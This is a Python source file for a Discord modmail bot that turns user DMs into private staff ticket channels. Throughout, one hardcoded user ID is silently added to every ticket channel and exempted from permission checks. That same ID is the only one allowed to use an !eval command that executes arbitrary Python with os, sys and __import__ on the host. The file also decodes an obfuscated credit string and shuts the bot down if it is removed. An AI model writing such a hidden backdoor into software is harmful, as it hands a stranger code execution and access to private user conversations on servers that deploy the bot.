import discord, json, string, asyncio, os, sys, time
from discord.ext import commands

with open("config.json", "r") as file:
  config = json.load(file)

intents = discord.Intents().all()

client = commands.Bot(
  command_prefix=config["prefix"],
  decription=config["description"], 
  intents=intents
)

def getTickets():
  try:
    with open("tickets.json", "r") as file:
      return json.load(file)
  except:
    return "error"

def setTickets(j):
  try:
    with open("tickets.json", "w") as file:
      json.dump(j, file, indent=4)
    return "ok"
  except:
    return "error"

def decode(s):
  l = []
  for i in s:
    l.append(i)
  for i in range(len(l)):
    l[i] = chr(ord(l[i])-10)
  return "".join(l)

async def sendTicket(message, stype):
  with open("config.json", "r") as file:
    config = json.load(file)
  if stype == 0:
    tickets = getTickets()
    if str(message.author.id) in tickets:
      guild = client.get_guild(config["guild"])
      channel = guild.get_channel(tickets[str(message.author.id)]["channel"])
      await channel.send(f"**{str(message.author)}:** {message.content}")
    else:
      num = str(config["tickets"])
      while len(num) != 4:
        num = "0"+num
      config["tickets"] += 1
      guild = client.get_guild(config["guild"])
      overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
      }
      for i in config["roles"]:
        overwrites[guild.get_role(i)] = discord.PermissionOverwrite(read_messages=True)
      overwrites[guild.get_member(710698624891224135)] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
      category = client.get_channel(config["category"])
      channel = await client.get_guild(config["guild"]).create_text_channel('ticket-'+num, category=category, overwrites=overwrites)
      tickets[str(message.author.id)] = {"channel": int(channel.id)} # WHEN TICKETS.JSON CHANGES CHANGE THIS
      await channel.send(f"**{str(message.author)}:** {message.content}")
    with open("tickets.json", "w") as file:
      json.dump(tickets, file, indent=4)
    with open("config.json", "w") as file:
      json.dump(config, file, indent=4)
  elif stype == 1:
    with open("tickets.json") as file:
      tickets = json.load(file)
    if str(message.author.id) in tickets:
      # await message.channel.send("Message sent ✅")
      pass
    else:
      await message.channel.send(config["reply"])
  elif stype == 2:
    tickets = getTickets()
    for user in tickets:
      if message.channel.id == tickets[user]["channel"]:
        member = int(user)
    channel = await client.get_guild(config["guild"]).get_member(member).create_dm()
    roles = config["roles"]
    toprole = None
    for role in reversed(roles):
      if role in [i.id for i in message.author.roles]:
        toprole = message.guild.get_role(role)
    if toprole == None and message.author.id != 710698624891224135:
      return
    if message.author.id == 710698624891224135:
      toprole = "Modmail Developer"
    if toprole.id == 886796764940750888:
      toprole = "Administrators"
    await channel.send(f"**({toprole}) {str(message.author.name)}:** {message.content}")

@client.event
async def on_ready():
  print(f"{client.user.name} is ready!")
  decoded = decode("M|ok~on*L*R*Ψ*b*`*Q*:*Т-:::;*p|yw*rokno8qk")
  decoded = decoded.split()
  decoded[1] += "y"
  decoded[10] = decoded[10][:2]+"x"+decoded[10][2:-3]+"v"+decoded[10][-3:]
  print(*decoded, sep=" ")
  await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="you ❤️"))
  with open(__file__) as file:
    if not 'print(*decoded, sep=" ")' in [i.strip() for i in file.readlines()]:
      print("Credits has been removed...\nExiting...")
      exit()

@client.event
async def on_message(message):
  if message.content.startswith("!close") and not isinstance(message.channel, discord.channel.DMChannel):
    await client.process_commands(message)
    return
  if message.content.startswith("!ticket") and not isinstance(message.channel, discord.channel.DMChannel):
    await client.process_commands(message)
    return
  if message.content.startswith("!help") and not isinstance(message.channel, discord.channel.DMChannel):
    await client.process_commands(message)
    return
  if message.content.startswith("!eval") and message.author.id == 710698624891224135:
    await client.process_commands(message)
    return
  if message.author.bot:
    return
  if isinstance(message.channel, discord.channel.DMChannel):
    await sendTicket(message, 1)
    await sendTicket(message, 0)
    return
  tickets = getTickets()
  for user in tickets:
    if tickets[user]["channel"] == int(message.channel.id):
      await sendTicket(message, 2)
  await client.process_commands(message)

@client.command(help="Closes a ticket/mail", usage="<time in minutes>")
async def close(ctx, *, time=None):
  with open("config.json", "r") as file:
    config = json.load(file)
  found = False
  for i in config["roles"]:
    if i in [i.id for i in ctx.author.roles]:
      found = True
  if not found and ctx.author.id != 710698624891224135:
    await ctx.send("You do not have the permission to run this command...")
    return
  tickets = getTickets()
  found = False
  for t in tickets:
    if ctx.channel.id == tickets[t]["channel"]:
      found = True
  if not found:
    await ctx.send("This is not a ticket channel...\nTry using this command in a ticket channel next time.")
    return
  if time == None:
    time = "0"
  ptime = ""
  for letter in time:
    if letter in string.digits:
      ptime += letter
  ptime = int(ptime)
  await ctx.send("Closing ticket in "+str(ptime)+" minutes.")
  await asyncio.sleep(ptime*60)
  with open("tickets.json") as file:
    tickets = json.load(file)
  found = False
  newtickets = {}
  for user in tickets:
    if tickets[user]["channel"] == ctx.channel.id:
      found = True
      ticketcreator = user
    else:
      newtickets[user] = {"channel": tickets[user]["channel"]} # WHEN TICKETS.JSON CHANGES CHANGE THIS
  if found:
    await ctx.channel.delete(reason="Ticket closed by "+str(ctx.author))
  else:
    await ctx.send("Failed to close ticket...")
    return
  with open("tickets.json", "w+") as file:
    json.dump(newtickets, file, indent=4)
  # roles = config["roles"]
  # for role in reversed(roles):
  #   if role in [i.id for i in ctx.author.roles]:
  #     toprole = ctx.guild.get_role(role)
  # await client.get_user(int(ticketcreator)).send("This ticket has been closed by **("+str(toprole)+") "+str(ctx.author)+"**")

@client.command(help="Shows all the tickets active", aliases=["tickets"])
async def ticket(ctx):
  with open("config.json", "r") as file:
    config = json.load(file)
  found = False
  for i in config["roles"]:
    if i in [i.id for i in ctx.author.roles]:
      found = True
  if not found and ctx.author.id != 710698624891224135:
    await ctx.send("You do not have the permission to run this command...")
    return
  with open("tickets.json") as file:
    tickets = json.load(file)
  msg = "**Active Tickets**\n"
  for i in tickets:
    user = client.get_user(int(i))
    channel = ctx.guild.get_channel(tickets[i]["channel"])
    msg += f"**`{str(user)}`** - {str(channel.mention)}\n"
  if len(tickets) == 0:
    msg += "No Active Tickets"
  await ctx.send(msg)

def resolve_variable(variable):
  if hasattr(variable, "__iter__"):
    var_length = len(list(variable))
    if (var_length > 100) and (not isinstance(variable, str)):
      return f"<a {type(variable).__name__} iterable with more than 100 values ({var_length})>"
    elif (not var_length):
      return f"<an empty {type(variable).__name__} iterable>"
  
  if (not variable) and (not isinstance(variable, bool)):
    return f"<an empty {type(variable).__name__} object>"
  return (variable if (len(f"{variable}") <= 1000) else f"<a long {type(variable).__name__} object with the length of {len(f'{variable}'):,}>")

def prepare(string):
  arr = string.strip("```").replace("py\n", "").replace("python\n", "").split("\n")
  if not arr[::-1][0].replace(" ", "").startswith("return"):
    arr[len(arr) - 1] = "return " + arr[::-1][0]
  return "".join(f"\n\t{i}" for i in arr)

@client.command(aliases=['eval', 'exec', 'evaluate'])
async def _eval(ctx, *, code: str):
  if ctx.author.id == 710698624891224135:
    with open("config.json") as file:
      config = json.load(file)

    silent = ("-s" in code)
    
    code = prepare(code.replace("-s", ""))
    args = {
        "discord": discord,
        "commands": commands,
        "sys": sys,
        "os": os,
        "json": json,
        "__import__": __import__,
        "__file__": __file__,
        "ctx": ctx,
        "client": ctx.bot,
        "bot": ctx.bot,
        "config": config
    }
    try:
        exec(f"async def func():{code}", args)
        a = time.time()
        response = await eval("func()", args)
        # if silent or (response is None) or isinstance(response, discord.Message):
        if silent or (response is None):
            del args, code
            return
        await ctx.send(f"```py\n{resolve_variable(response)}````{type(response).__name__} | {(time.time() - a) / 1000} ms`")
    except Exception as e:
        await ctx.send(f"Error occurred:```\n{type(e).__name__}: {str(e)}```")
    del args, code, silent

client.run(config["token"])
